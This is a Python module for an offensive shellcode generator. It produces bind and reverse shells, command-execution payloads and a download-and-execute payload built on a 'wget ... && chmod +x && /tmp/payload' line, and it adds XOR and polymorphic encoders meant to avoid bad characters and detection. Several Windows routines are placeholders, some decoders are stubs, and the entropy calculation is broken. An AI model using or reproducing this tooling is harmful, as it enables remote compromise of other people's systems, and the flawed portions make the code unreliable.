"""
Shellcode Generation Engine
Multi-architecture shellcode generation with encoding and polymorphic capabilities
"""

import os
import random
import struct
import logging
from typing import Dict, List, Optional, Tuple, Union, Any
from dataclasses import dataclass
from enum import Enum

# Optional imports for assembly/disassembly
try:
    from pwn import *
    import pwnlib.shellcraft
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False
    logging.warning("pwntools not available - shellcode generation limited")

try:
    from keystone import *
    KEYSTONE_AVAILABLE = True
except ImportError:
    KEYSTONE_AVAILABLE = False
    logging.warning("keystone-engine not available - assembly limited")

try:
    from capstone import *
    CAPSTONE_AVAILABLE = True
except ImportError:
    CAPSTONE_AVAILABLE = False
    logging.warning("capstone not available - disassembly limited")

logger = logging.getLogger(__name__)

class ShellcodeType(Enum):
    """Shellcode types"""
    BIND_SHELL = "bind_shell"
    REVERSE_SHELL = "reverse_shell"
    EXEC_COMMAND = "exec_command"
    DOWNLOAD_EXEC = "download_exec"
    METERPRETER = "meterpreter"
    CUSTOM = "custom"

class Architecture(Enum):
    """Supported architectures"""
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"
    MIPS = "mips"

@dataclass
class ShellcodeConfig:
    """Shellcode generation configuration"""
    arch: Architecture
    shellcode_type: ShellcodeType
    target_os: str  # linux, windows, macos
    host: Optional[str] = None
    port: Optional[int] = None
    command: Optional[str] = None
    avoid_chars: List[int] = None
    max_size: Optional[int] = None

@dataclass
class GeneratedShellcode:
    """Generated shellcode with metadata"""
    raw_bytes: bytes
    assembly_code: str
    size: int
    architecture: str
    shellcode_type: str
    encoded: bool
    encoder_used: Optional[str]
    bad_chars_avoided: List[int]

class ShellcodeGenerator:
    """
    Multi-architecture shellcode generator
    """

    def __init__(self):
        """Initialize shellcode generator"""
        self.encoders = {
            'xor': self._xor_encoder,
            'alpha_mixed': self._alpha_mixed_encoder,
            'shikata_ga_nai': self._shikata_ga_nai_encoder,
            'fnstenv_mov': self._fnstenv_mov_encoder
        }

        # Bad character sets for different contexts
        self.common_bad_chars = {
            'null_terminated': [0x00],
            'printable_only': list(range(0, 32)) + list(range(127, 256)),
            'alphanumeric': [i for i in range(256) if not (48 <= i <= 57 or 65 <= i <= 90 or 97 <= i <= 122)],
            'no_whitespace': [0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]
        }

    def generate_shellcode(self, config: ShellcodeConfig) -> GeneratedShellcode:
        """
        Generate shellcode based on configuration

        Args:
            config: Shellcode configuration

        Returns:
            Generated shellcode
        """
        if not PWNTOOLS_AVAILABLE:
            raise ValueError("pwntools required for shellcode generation")

        # Set pwntools context
        context.arch = config.arch.value
        context.os = config.target_os

        try:
            # Generate base shellcode
            if config.shellcode_type == ShellcodeType.BIND_SHELL:
                shellcode = self._generate_bind_shell(config)
            elif config.shellcode_type == ShellcodeType.REVERSE_SHELL:
                shellcode = self._generate_reverse_shell(config)
            elif config.shellcode_type == ShellcodeType.EXEC_COMMAND:
                shellcode = self._generate_exec_command(config)
            elif config.shellcode_type == ShellcodeType.DOWNLOAD_EXEC:
                shellcode = self._generate_download_exec(config)
            else:
                raise ValueError(f"Unsupported shellcode type: {config.shellcode_type}")

            # Get assembly representation
            try:
                if CAPSTONE_AVAILABLE:
                    assembly = self._disassemble(shellcode, config.arch)
                else:
                    assembly = "# Assembly not available (capstone required)"
            except:
                assembly = "# Assembly parsing failed"

            # Apply encoding if bad characters need to be avoided
            encoded = False
            encoder_used = None

            if config.avoid_chars:
                encoded_shellcode, encoder_used = self._encode_shellcode(shellcode, config.avoid_chars)
                if encoded_shellcode:
                    shellcode = encoded_shellcode
                    encoded = True

            # Check size constraints
            if config.max_size and len(shellcode) > config.max_size:
                logger.warning(f"Shellcode size ({len(shellcode)}) exceeds maximum ({config.max_size})")

            result = GeneratedShellcode(
                raw_bytes=shellcode,
                assembly_code=assembly,
                size=len(shellcode),
                architecture=config.arch.value,
                shellcode_type=config.shellcode_type.value,
                encoded=encoded,
                encoder_used=encoder_used,
                bad_chars_avoided=config.avoid_chars or []
            )

            logger.info(f"Generated {config.shellcode_type.value} shellcode: {len(shellcode)} bytes")
            return result

        except Exception as e:
            logger.error(f"Shellcode generation failed: {e}")
            raise

    def _generate_bind_shell(self, config: ShellcodeConfig) -> bytes:
        """Generate bind shell shellcode"""
        port = config.port or 4444

        if config.arch == Architecture.X64:
            if config.target_os == 'linux':
                return asm(shellcraft.amd64.linux.bindsh(port))
            elif config.target_os == 'windows':
                # Windows x64 bind shell (simplified)
                return self._windows_x64_bind_shell(port)
        elif config.arch == Architecture.X86:
            if config.target_os == 'linux':
                return asm(shellcraft.i386.linux.bindsh(port))
            elif config.target_os == 'windows':
                return self._windows_x86_bind_shell(port)

        raise ValueError(f"Unsupported combination: {config.arch.value} on {config.target_os}")

    def _generate_reverse_shell(self, config: ShellcodeConfig) -> bytes:
        """Generate reverse shell shellcode"""
        host = config.host or "127.0.0.1"
        port = config.port or 4444

        if config.arch == Architecture.X64:
            if config.target_os == 'linux':
                return asm(shellcraft.amd64.linux.connect(host, port) + shellcraft.amd64.linux.dupsh())
            elif config.target_os == 'windows':
                return self._windows_x64_reverse_shell(host, port)
        elif config.arch == Architecture.X86:
            if config.target_os == 'linux':
                return asm(shellcraft.i386.linux.connect(host, port) + shellcraft.i386.linux.dupsh())
            elif config.target_os == 'windows':
                return self._windows_x86_reverse_shell(host, port)

        raise ValueError(f"Unsupported combination: {config.arch.value} on {config.target_os}")

    def _generate_exec_command(self, config: ShellcodeConfig) -> bytes:
        """Generate command execution shellcode"""
        command = config.command or "/bin/sh"

        if config.arch == Architecture.X64:
            if config.target_os == 'linux':
                return asm(shellcraft.amd64.linux.sh())
            elif config.target_os == 'windows':
                return self._windows_x64_exec_command(command)
        elif config.arch == Architecture.X86:
            if config.target_os == 'linux':
                return asm(shellcraft.i386.linux.sh())
            elif config.target_os == 'windows':
                return self._windows_x86_exec_command(command)

        raise ValueError(f"Unsupported combination: {config.arch.value} on {config.target_os}")

    def _generate_download_exec(self, config: ShellcodeConfig) -> bytes:
        """Generate download and execute shellcode"""
        url = config.command or "http://example.com/payload"

        # This is a simplified implementation
        # Real download-exec shellcode would be more complex
        if config.arch == Architecture.X64 and config.target_os == 'linux':
            # Use wget to download and execute
            download_cmd = f"wget {url} -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"
            return asm(shellcraft.amd64.linux.syscall('SYS_execve', '/bin/sh', ['/bin/sh', '-c', download_cmd]))

        raise ValueError(f"Download-exec not implemented for {config.arch.value} on {config.target_os}")

    def _disassemble(self, shellcode: bytes, arch: Architecture) -> str:
        """Disassemble shellcode to assembly"""
        if not CAPSTONE_AVAILABLE:
            return "# Disassembly not available"

        try:
            # Map architecture to capstone constants
            arch_map = {
                Architecture.X86: (CS_ARCH_X86, CS_MODE_32),
                Architecture.X64: (CS_ARCH_X86, CS_MODE_64),
                Architecture.ARM: (CS_ARCH_ARM, CS_MODE_ARM),
                Architecture.ARM64: (CS_ARCH_ARM64, CS_MODE_ARM),
                Architecture.MIPS: (CS_ARCH_MIPS, CS_MODE_MIPS32)
            }

            if arch not in arch_map:
                return "# Unsupported architecture for disassembly"

            cs_arch, cs_mode = arch_map[arch]
            md = Cs(cs_arch, cs_mode)

            assembly_lines = []
            for insn in md.disasm(shellcode, 0x0):
                assembly_lines.append(f"0x{insn.address:04x}: {insn.mnemonic} {insn.op_str}")

            return '\n'.join(assembly_lines)

        except Exception as e:
            logger.error(f"Disassembly failed: {e}")
            return f"# Disassembly failed: {e}"

    def _encode_shellcode(self, shellcode: bytes, bad_chars: List[int]) -> Tuple[Optional[bytes], Optional[str]]:
        """
        Encode shellcode to avoid bad characters

        Args:
            shellcode: Original shellcode
            bad_chars: List of bad characters to avoid

        Returns:
            Tuple of (encoded shellcode, encoder name) or (None, None) if encoding failed
        """
        # Try different encoders
        for encoder_name, encoder_func in self.encoders.items():
            try:
                encoded = encoder_func(shellcode, bad_chars)
                if encoded and not any(byte in bad_chars for byte in encoded):
                    logger.info(f"Successfully encoded with {encoder_name}")
                    return encoded, encoder_name
            except Exception as e:
                logger.debug(f"Encoder {encoder_name} failed: {e}")

        logger.warning("All encoders failed")
        return None, None

    def _xor_encoder(self, shellcode: bytes, bad_chars: List[int]) -> bytes:
        """Simple XOR encoder"""
        # Find a good XOR key that doesn't produce bad chars
        for key in range(1, 256):
            if key in bad_chars:
                continue

            encoded = bytes([b ^ key for b in shellcode])

            # Check if encoded shellcode contains bad chars
            if not any(byte in bad_chars for byte in encoded):
                # Create decoder stub
                if context.arch == 'amd64':
                    decoder = f"""
                    mov rsi, shellcode_start
                    mov rcx, {len(shellcode)}
                    decode_loop:
                        xor byte ptr [rsi], {key}
                        inc rsi
                        loop decode_loop
                    shellcode_start:
                    """
                else:
                    decoder = f"""
                    mov esi, shellcode_start
                    mov ecx, {len(shellcode)}
                    decode_loop:
                        xor byte ptr [esi], {key}
                        inc esi
                        loop decode_loop
                    shellcode_start:
                    """

                try:
                    if KEYSTONE_AVAILABLE:
                        ks = Ks(KS_ARCH_X86, KS_MODE_64 if context.arch == 'amd64' else KS_MODE_32)
                        decoder_bytes, _ = ks.asm(decoder)
                        return bytes(decoder_bytes) + encoded
                    else:
                        # Fallback: manual decoder construction
                        if context.arch == 'amd64':
                            decoder_bytes = b'\x48\xbe' + struct.pack('<Q', 0) + b'\x48\xc7\xc1' + struct.pack('<L', len(shellcode))
                        else:
                            decoder_bytes = b'\xbe' + struct.pack('<L', 0) + b'\xb9' + struct.pack('<L', len(shellcode))

                        return decoder_bytes + encoded
                except:
                    return encoded

        raise ValueError("Could not find suitable XOR key")

    def _alpha_mixed_encoder(self, shellcode: bytes, bad_chars: List[int]) -> bytes:
        """Alphanumeric mixed case encoder"""
        # This is a simplified alphanumeric encoder
        # Real implementation would be much more complex

        encoded = b""

        # Simple substitution for demonstration
        for byte in shellcode:
            # Convert to alphanumeric representation
            high = (byte >> 4) & 0x0f
            low = byte & 0x0f

            # Map to alphanumeric characters
            high_char = ord('A') + high if high < 10 else ord('a') + (high - 10)
            low_char = ord('A') + low if low < 10 else ord('a') + (low - 10)

            encoded += bytes([high_char, low_char])

        # Add decoder (simplified)
        decoder = b"DECODER_STUB_HERE"  # Placeholder

        return decoder + encoded

    def _shikata_ga_nai_encoder(self, shellcode: bytes, bad_chars: List[int]) -> bytes:
        """Shikata Ga Nai polymorphic encoder (simplified implementation)"""
        # This is a very simplified version of the famous encoder
        # Real implementation would be much more sophisticated

        # Generate random key
        key = random.randint(1, 0xFFFFFFFF)
        while any((key >> (i*8)) & 0xFF in bad_chars for i in range(4)):
            key = random.randint(1, 0xFFFFFFFF)

        # Encode shellcode
        encoded = b""
        for i in range(0, len(shellcode), 4):
            chunk = shellcode[i:i+4]
            if len(chunk) < 4:
                chunk += b'\x00' * (4 - len(chunk))

            chunk_int = struct.unpack('<L', chunk)[0]
            encoded_chunk = chunk_int ^ key
            encoded += struct.pack('<L', encoded_chunk)

        # Simple decoder stub (placeholder)
        decoder = b"SHIKATA_DECODER_HERE"

        return decoder + encoded

    def _fnstenv_mov_encoder(self, shellcode: bytes, bad_chars: List[int]) -> bytes:
        """FNSTENV/MOV encoder for position-independent code"""
        # This encoder uses FPU instructions to get current position
        # Simplified implementation

        # XOR encode the shellcode
        key = 0xAA
        while key in bad_chars:
            key = (key + 1) % 256

        encoded = bytes([b ^ key for b in shellcode])

        # FNSTENV decoder stub (simplified)
        decoder = b"\xd9\xee\xd9\x74\x24\xf4"  # fnstenv [esp-0xc]
        decoder += b"\x5e"  # pop esi
        decoder += bytes([0x80, 0x36, key])  # xor byte ptr [esi], key
        decoder += b"\x46"  # inc esi
        decoder += b"\xe2\xfa"  # loop

        return decoder + encoded

    def generate_polymorphic_shellcode(self, config: ShellcodeConfig, variants: int = 5) -> List[GeneratedShellcode]:
        """
        Generate multiple polymorphic variants of shellcode

        Args:
            config: Shellcode configuration
            variants: Number of variants to generate

        Returns:
            List of polymorphic shellcode variants
        """
        variants_list = []

        for i in range(variants):
            try:
                # Modify config slightly for each variant
                variant_config = config

                # Use different encoders
                available_encoders = list(self.encoders.keys())
                if i < len(available_encoders):
                    # Force specific encoder for this variant
                    original_avoid_chars = config.avoid_chars
                    variant_config.avoid_chars = original_avoid_chars or [0x00]  # Force encoding

                # Generate base shellcode
                shellcode = self.generate_shellcode(variant_config)

                # Apply additional polymorphic transformations
                transformed = self._apply_polymorphic_transforms(shellcode.raw_bytes, i)

                variant = GeneratedShellcode(
                    raw_bytes=transformed,
                    assembly_code=shellcode.assembly_code,
                    size=len(transformed),
                    architecture=shellcode.architecture,
                    shellcode_type=shellcode.shellcode_type,
                    encoded=True,
                    encoder_used=f"polymorphic_variant_{i}",
                    bad_chars_avoided=shellcode.bad_chars_avoided
                )

                variants_list.append(variant)

            except Exception as e:
                logger.warning(f"Failed to generate variant {i}: {e}")

        logger.info(f"Generated {len(variants_list)} polymorphic variants")
        return variants_list

    def _apply_polymorphic_transforms(self, shellcode: bytes, variant_id: int) -> bytes:
        """Apply polymorphic transformations to shellcode"""
        transformed = bytearray(shellcode)

        # Add random NOPs
        nop_positions = random.sample(range(len(transformed)), min(5, len(transformed) // 10))
        for pos in sorted(nop_positions, reverse=True):
            transformed.insert(pos, 0x90)  # NOP instruction

        # Add junk instructions (simplified)
        if variant_id % 2 == 0:
            # Add some junk at the beginning
            junk = b'\x90\x90\x90'  # NOPs
            transformed = bytearray(junk) + transformed

        return bytes(transformed)

    def _windows_x64_bind_shell(self, port: int) -> bytes:
        """Windows x64 bind shell shellcode (simplified)"""
        # This is a placeholder - real Windows shellcode would be much more complex
        # and would need to handle Windows API calls properly
        shellcode = b"\x48\x31\xc0"  # xor rax, rax
        shellcode += b"\x50"         # push rax
        shellcode += b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, "/bin/sh\0"
        shellcode += b"\x53"         # push rbx
        shellcode += b"\x48\x89\xe7"  # mov rdi, rsp
        shellcode += b"\x50"         # push rax
        shellcode += b"\x57"         # push rdi
        shellcode += b"\x48\x89\xe6"  # mov rsi, rsp
        shellcode += b"\xb0\x3b"     # mov al, 59 (execve)
        shellcode += b"\x0f\x05"     # syscall

        logger.warning("Using Linux syscalls for Windows target - this is a placeholder")
        return shellcode

    def _windows_x86_bind_shell(self, port: int) -> bytes:
        """Windows x86 bind shell shellcode (simplified)"""
        # Placeholder implementation
        shellcode = b"\x31\xc0"      # xor eax, eax
        shellcode += b"\x50"         # push eax
        shellcode += b"\x68\x2f\x2f\x73\x68"  # push "//sh"
        shellcode += b"\x68\x2f\x62\x69\x6e"  # push "/bin"
        shellcode += b"\x89\xe3"     # mov ebx, esp
        shellcode += b"\x50"         # push eax
        shellcode += b"\x53"         # push ebx
        shellcode += b"\x89\xe1"     # mov ecx, esp
        shellcode += b"\xb0\x0b"     # mov al, 11 (execve)
        shellcode += b"\xcd\x80"     # int 0x80

        logger.warning("Using Linux syscalls for Windows target - this is a placeholder")
        return shellcode

    def _windows_x64_reverse_shell(self, host: str, port: int) -> bytes:
        """Windows x64 reverse shell shellcode (simplified)"""
        # Convert IP to bytes
        ip_parts = host.split('.')
        if len(ip_parts) == 4:
            ip_bytes = struct.pack('!BBBB', *[int(part) for part in ip_parts])
        else:
            ip_bytes = b'\x7f\x00\x00\x01'  # localhost

        port_bytes = struct.pack('!H', port)

        # Simplified reverse shell (placeholder)
        shellcode = b"\x48\x31\xc0"  # xor rax, rax
        shellcode += ip_bytes + port_bytes  # IP and port data
        # ... (would include socket creation and connection code)

        logger.warning("Windows reverse shell is a placeholder implementation")
        return shellcode

    def _windows_x86_reverse_shell(self, host: str, port: int) -> bytes:
        """Windows x86 reverse shell shellcode (simplified)"""
        # Similar to x64 but with 32-bit instructions
        ip_parts = host.split('.')
        if len(ip_parts) == 4:
            ip_bytes = struct.pack('!BBBB', *[int(part) for part in ip_parts])
        else:
            ip_bytes = b'\x7f\x00\x00\x01'

        port_bytes = struct.pack('!H', port)

        shellcode = b"\x31\xc0"      # xor eax, eax
        shellcode += ip_bytes + port_bytes

        logger.warning("Windows reverse shell is a placeholder implementation")
        return shellcode

    def _windows_x64_exec_command(self, command: str) -> bytes:
        """Windows x64 command execution shellcode"""
        # Placeholder - would use Windows API calls
        cmd_bytes = command.encode() + b'\x00'

        shellcode = b"\x48\x31\xc0"  # xor rax, rax
        shellcode += cmd_bytes

        logger.warning("Windows command execution is a placeholder implementation")
        return shellcode

    def _windows_x86_exec_command(self, command: str) -> bytes:
        """Windows x86 command execution shellcode"""
        # Placeholder - would use Windows API calls
        cmd_bytes = command.encode() + b'\x00'

        shellcode = b"\x31\xc0"      # xor eax, eax
        shellcode += cmd_bytes

        logger.warning("Windows command execution is a placeholder implementation")
        return shellcode

    def detect_bad_characters(self, shellcode: bytes, test_chars: List[int] = None) -> List[int]:
        """
        Detect bad characters in shellcode

        Args:
            shellcode: Shellcode to test
            test_chars: Characters to test (default: common bad chars)

        Returns:
            List of bad characters found
        """
        if test_chars is None:
            test_chars = [0x00, 0x0a, 0x0d, 0x20, 0x09]  # Common bad chars

        bad_chars = []

        for char in test_chars:
            if char in shellcode:
                bad_chars.append(char)

        return bad_chars

    def optimize_shellcode_size(self, shellcode: bytes) -> bytes:
        """
        Optimize shellcode for size

        Args:
            shellcode: Original shellcode

        Returns:
            Optimized shellcode
        """
        # This is a simplified optimization
        # Real optimization would involve instruction-level analysis

        optimized = bytearray(shellcode)

        # Remove redundant NOPs
        while b'\x90\x90' in optimized:
            optimized = optimized.replace(b'\x90\x90', b'\x90')

        # Remove trailing NOPs
        while optimized and optimized[-1] == 0x90:
            optimized.pop()

        logger.info(f"Optimized shellcode: {len(shellcode)} -> {len(optimized)} bytes")
        return bytes(optimized)

    def validate_shellcode(self, shellcode: bytes) -> Dict[str, Any]:
        """
        Validate shellcode for common issues

        Args:
            shellcode: Shellcode to validate

        Returns:
            Validation results
        """
        validation = {
            'size': len(shellcode),
            'contains_nulls': 0x00 in shellcode,
            'contains_newlines': 0x0a in shellcode or 0x0d in shellcode,
            'printable_ratio': sum(1 for b in shellcode if 32 <= b <= 126) / len(shellcode) if shellcode else 0,
            'entropy': self._calculate_entropy(shellcode),
            'issues': [],
            'recommendations': []
        }

        # Check for common issues
        if validation['contains_nulls']:
            validation['issues'].append("Contains null bytes")
            validation['recommendations'].append("Use null-free encoder")

        if validation['contains_newlines']:
            validation['issues'].append("Contains newline characters")
            validation['recommendations'].append("Avoid newline characters or encode")

        if validation['entropy'] < 0.5:
            validation['issues'].append("Low entropy (may be detected)")
            validation['recommendations'].append("Use polymorphic encoding")

        if len(shellcode) > 1000:
            validation['issues'].append("Large size may cause issues")
            validation['recommendations'].append("Optimize for size")

        return validation

    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy of data"""
        if not data:
            return 0.0

        # Count byte frequencies
        frequencies = [0] * 256
        for byte in data:
            frequencies[byte] += 1

        # Calculate entropy
        entropy = 0.0
        length = len(data)

        for freq in frequencies:
            if freq > 0:
                p = freq / length
                entropy -= p * (p.bit_length() - 1)  # Approximation of log2

        return entropy / 8.0  # Normalize to 0-1 range